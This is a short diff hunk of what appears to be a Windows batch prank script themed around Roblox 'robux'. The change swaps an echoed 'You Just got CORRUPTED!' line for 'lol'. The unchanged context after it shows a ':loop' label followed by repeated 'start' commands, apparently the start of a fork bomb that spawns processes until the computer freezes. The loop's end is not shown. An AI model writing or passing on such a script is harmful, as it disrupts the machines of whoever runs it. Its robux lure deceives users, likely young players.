@@ -16,7 +16,7 @@
  exit
  :no robux
  echo but you need robux...lol
- echo You Just got CORRUPTED!
+ echo lol
  :loop
  start
  start
